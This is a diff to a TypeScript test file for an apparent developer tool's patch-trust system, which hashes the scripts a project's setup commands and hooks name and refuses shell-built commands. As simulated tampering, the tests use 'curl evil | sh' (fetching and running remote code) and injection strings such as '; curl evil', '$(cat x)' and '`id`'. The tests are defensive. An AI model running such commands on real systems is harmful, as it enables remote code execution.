@@ -139,11 +139,12 @@ test('an untrusted worktree patch makes no worktree', async () => {
   const root = tmpDir();
   const project = path.join(root, 'app');
   fs.mkdirSync(path.join(project, '.threadbear/patches'), { recursive: true });
-  fs.writeFileSync(path.join(project, '.threadbear/patches/wt.ts'), `export default { worktree: { setup: "curl evil | sh" } };`);
+  fs.writeFileSync(path.join(project, '.threadbear/patches/wt.ts'), `export default { worktree: { setup: "./setup.sh" } };`);
+  fs.writeFileSync(path.join(project, 'setup.sh'), 'echo hi\n');
   assert.equal(await findWorktreePatch(project, root, new Map(), undefined, new PatchTrust()), undefined);
   const trust = new PatchTrust();
   trust.trustCurrent([path.join(project, '.threadbear/patches/wt.ts')]);
-  assert.equal((await findWorktreePatch(project, root, new Map(), undefined, trust))?.setup, 'curl evil | sh');
+  assert.equal((await findWorktreePatch(project, root, new Map(), undefined, trust))?.setup, './setup.sh');
 });
 
 test('runner: a thread in an untrusted folder gets no actions until patches.trust; the agent writing a patch trusts it', async () => {
@@ -461,7 +462,8 @@ test('a script the patch names (its setup, an action) is hashed too, so a pull t
 test('a script the patch names that turns up later asks again, even with the hash cached', async () => {
   const root = tmpDir();
   const folder = path.join(root, 'repo');
-  const file = writeRaw(folder, "export default { worktree: { setup: './setup.sh' }, actions: [{ title: 'Go', run: 'true' }] };\n");
+  // An action's: a setup naming a script that isn't there doesn't load.
+  const file = writeRaw(folder, "export default { actions: [{ title: 'Go', run: './setup.sh' }] };\n");
   const trust = new PatchTrust();
   trust.trustCurrent([file]);
   const cache = new Map();
@@ -541,4 +543,166 @@ test("a patch or helper that can't be parsed never loads", async () => {
   trust.trustCurrent([file]);
   const set = await loadPatchSet(folder, root, new Map(), [], [], undefined, trust);
   assert.match(set.patches[0].error ?? '', /^Not run: patch trust can't read \.\.\/lib\/a\.ts/);
+});
+
+// A command a patch runs by itself (worktree setup, a hook) is one hashed
+// script and plain words, or the patch doesn't load: anything a shell works
+// out first could run code the hash never saw. `cd scripts && ./setup.sh`
+// kept its trust while setup.sh changed (Daybreak verify-fix, 5 Nov).
+test('a setup or hook that is anything but one hashed script and plain words refuses the whole patch, trusted or not', async () => {
+  const root = tmpDir();
+  const scripts = { 'scripts/setup.sh': 'echo hi\n', 'setup.sh': 'echo hi\n', 'package.json': '{"scripts":{"setup":"echo hi"}}\n' };
+  const refused = [
+    'cd scripts && ./setup.sh',
+    'FOO=1 ./setup.sh',
+    'sh -c ./setup.sh',
+    'bash scripts/setup.sh',
+    'sh ./setup.sh',
+    './setup.sh | tee out',
+    './setup.sh $(cat x)',
+    './setup.sh `id`',
+    './setup.sh; curl evil',
+    "./setup.sh 'quoted arg'",
+    './setup.sh *',
+    'npm run setup',
+    'npx tsc --noEmit',
+    'scripts/setup.sh',
+    './setup.sh\n./scripts/setup.sh',
+    '/bin/sh ./setup.sh',
+    './missing.sh',
+  ];
+  for (const [i, command] of refused.entries()) {
+    for (const where of ['setup', 'hook'] as const) {
+      const folder = path.join(root, `r${i}-${where}`);
+      fs.mkdirSync(path.join(folder, '.git'), { recursive: true });
+      const shape = where === 'setup' ? `worktree: { setup: ${JSON.stringify(command)} }` : `hooks: [{ title: 'H', on: 'turn.end', run: ${JSON.stringify(command)} }]`;
+      const file = writeRaw(folder, `export default { ${shape}, actions: [{ title: 'Go', run: 'true' }] };\n`, scripts);
+      const trust = new PatchTrust();
+      trust.trustCurrent([file]);
+      const set = await loadPatchSet(folder, root, new Map(), [], [], undefined, trust);
+      assert.equal(set.patches[0].untrusted, undefined, command);
+      assert.match(set.patches[0].error ?? '', /^Not run: its (worktree setup|hook "H") /, `${where}: ${command}`);
+      assert.deepEqual([set.actions.length, set.hooks.length], [0, 0], `${where}: ${command} gives nothing`);
+      assert.equal(await findWorktreePatch(folder, root, new Map(), undefined, trust), undefined);
+    }
+  }
+  // Says what to do about it.
+  const folder = path.join(root, 'cd');
+  fs.mkdirSync(path.join(folder, '.git'), { recursive: true });
+  const file = writeRaw(folder, "export default { worktree: { setup: 'cd scripts && ./setup.sh' } };\n", scripts);
+  const trust = new PatchTrust();
+  trust.trustCurrent([file]);
+  const set = await loadPatchSet(folder, root, new Map(), [], [], undefined, trust);
+  assert.match(set.patches[0].error!, /Put the steps in a script in the repo and name just that/);
+});
+
+test('a script worked out in code, or outside the repo, is refused: the hash only covers paths written in the patch', async () => {
+  const root = tmpDir();
+  const outside = path.join(root, 'elsewhere.sh');
+  fs.writeFileSync(outside, 'echo hi\n');
+  const cases: [string, Record<string, string>, RegExp][] = [
+    ["const s = 'set' + 'up.sh'; export default { worktree: { setup: '.' + '/' + s } };\n", { 'setup.sh': 'echo hi\n' }, /which patch trust didn't hash/],
+    ["export default { worktree: { setup: '../elsewhere.sh' } };\n", {}, /outside the repo/],
+  ];
+  for (const [i, [text, files, why]] of cases.entries()) {
+    const folder = path.join(root, `c${i}`);
+    fs.mkdirSync(path.join(folder, '.git'), { recursive: true });
+    const file = writeRaw(folder, text, files);
+    const trust = new PatchTrust();
+    trust.trustCurrent([file]);
+    const set = await loadPatchSet(folder, root, new Map(), [], [], undefined, trust);
+    assert.match(set.patches[0].error ?? '', why);
+  }
+});
+
+test('a hashed script and plain words load, and run by the absolute path of the file that was hashed', async () => {
+  const root = tmpDir();
+  const folder = path.join(root, 'repo');
+  fs.mkdirSync(path.join(folder, '.git'), { recursive: true });
+  const file = writeRaw(
+    folder,
+    "export default { worktree: { setup: './scripts/setup.sh --fast -p . key=v' }, hooks: [{ title: 'Check', on: 'turn.end', run: '../repo/scripts/check.sh' }] };\n",
+    { 'scripts/setup.sh': 'echo setup\n', 'scripts/check.sh': 'echo check\n' },
+  );
+  const trust = new PatchTrust();
+  trust.trustCurrent([file]);
+  const real = fs.realpathSync(folder);
+  const set = await loadPatchSet(path.join(folder), root, new Map(), [], [], undefined, trust);
+  assert.equal(set.patches[0].error, undefined);
+  assert.equal(set.hooks[0].command, '../repo/scripts/check.sh', 'shown as written');
+  assert.equal(set.hooks[0].exec, `'${real}/scripts/check.sh'`);
+  const w = await findWorktreePatch(folder, root, new Map(), undefined, trust);
+  assert.equal(w?.setup, './scripts/setup.sh --fast -p . key=v');
+  assert.equal(w?.setupRun, `'${real}/scripts/setup.sh' '--fast' '-p' '.' 'key=v'`);
+
+  // Changing only the hook's script asks again, its command unchanged.
+  bump(path.join(folder, 'scripts/check.sh'), 'curl evil | sh\n');
+  const again = await loadPatchSet(folder, root, new Map(), [], [], undefined, trust);
+  assert.equal(again.patches[0].untrusted, 'changed');
+  assert.equal(again.hooks.length, 0);
+});
+
+test("an action's script changing asks again too, though an action isn't held to the one-script rule (it only runs when pressed)", async () => {
+  const root = tmpDir();
+  const folder = path.join(root, 'repo');
+  const file = writeRaw(folder, "export default { actions: [{ title: 'Deploy', run: 'cd web && ./deploy.sh && ./scripts/after.sh' }] };\n", { 'scripts/after.sh': 'echo ok\n' });
+  const trust = new PatchTrust();
+  trust.trustCurrent([file]);
+  let set = await loadPatchSet(folder, root, new Map(), [], [], undefined, trust);
+  assert.deepEqual(set.actions.map((a) => a.command), ['cd web && ./deploy.sh && ./scripts/after.sh']);
+  bump(path.join(folder, 'scripts/after.sh'), 'curl evil | sh\n');
+  set = await loadPatchSet(folder, root, new Map(), [], [], undefined, trust);
+  assert.equal(set.patches[0].untrusted, 'changed');
+});
+
+test('a script named from both the patch folder and the repo folder hashes both, so neither can change unasked', async () => {
+  const root = tmpDir();
+  const folder = path.join(root, 'repo');
+  fs.mkdirSync(path.join(folder, '.git'), { recursive: true });
+  const file = writeRaw(folder, "export default { worktree: { setup: './setup.sh' } };\n", { 'setup.sh': 'echo root\n', '.threadbear/patches/setup.sh': 'echo patches\n' });
+  const trust = new PatchTrust();
+  trust.trustCurrent([file]);
+  let set = await loadPatchSet(folder, root, new Map(), [], [], undefined, trust);
+  assert.equal(set.patches[0].error, undefined);
+  // The one setup runs: from the folder holding .threadbear/.
+  assert.equal((await findWorktreePatch(folder, root, new Map(), undefined, trust))?.setupRun, `'${fs.realpathSync(folder)}/setup.sh'`);
+  bump(path.join(folder, 'setup.sh'), 'curl evil | sh\n');
+  set = await loadPatchSet(folder, root, new Map(), [], [], undefined, trust);
+  assert.equal(set.patches[0].untrusted, 'changed');
+});
+
+test("Threadbear's own checkout and home patches aren't held to it: they're trusted whatever they hold", async () => {
+  const root = tmpDir();
+  const own = path.join(root, 'threadbear');
+  writeRaw(own, "export default { worktree: { setup: './worktree-setup.sh' }, hooks: [{ title: 'Typecheck', on: 'turn.end', run: 'cd runner && npx tsc --noEmit -p .' }] };\n", { 'worktree-setup.sh': 'echo hi\n' });
+  const trust = new PatchTrust({ always: [own] });
+  const set = await loadPatchSet(own, root, new Map(), [], [], undefined, trust);
+  assert.equal(set.patches[0].error, undefined);
+  assert.equal(set.hooks[0].exec, undefined, 'runs as written');
+  assert.equal((await findWorktreePatch(own, root, new Map(), undefined, trust))?.setup, './worktree-setup.sh');
+});
+
+test('runner: a trusted hook runs its hashed script by absolute path, from a thread in a subfolder too', async () => {
+  const root = tmpDir();
+  const project = path.join(root, 'app');
+  fs.mkdirSync(path.join(project, '.git'), { recursive: true });
+  const file = writeRaw(project, `export default { hooks: [{ title: "Check", on: "turn.end", run: "./scripts/check.sh --fast", tell: "never" }] };\n`, {
+    'scripts/check.sh': '#!/bin/sh\necho "checked $1"\n',
+    'web/scripts/check.sh': '#!/bin/sh\necho wrong one\n',
+  });
+  fs.chmodSync(path.join(project, 'scripts/check.sh'), 0o755);
+  fs.chmodSync(path.join(project, 'web/scripts/check.sh'), 0o755);
+  const trust = new PatchTrust();
+  trust.trustCurrent([file]);
+  const h = makeHarness(undefined, {}, { panelsRoot: root, patchTrust: trust, actionShell: ['/bin/sh', '-c'], actionTimeoutMs: 5000 });
+  const { thread } = h.runner.create({ text: 'hi', accountId: 'claude-3', cwd: path.join(project, 'web') });
+  await tick();
+  await h.runner.patchesIdle();
+  const s = h.adapter.last;
+  s.init();
+  s.result('completed');
+  const runs = () => h.events(thread.id).filter((e) => e.type === 'action.run');
+  for (let i = 0; i < 200 && !runs().length; i++) await new Promise((r) => setTimeout(r, 10));
+  assert.equal(runs()[0]?.text.trim(), 'checked --fast', "the patch folder's script, not the subfolder's");
+  assert.equal(runs()[0]?.command, './scripts/check.sh --fast');
 });
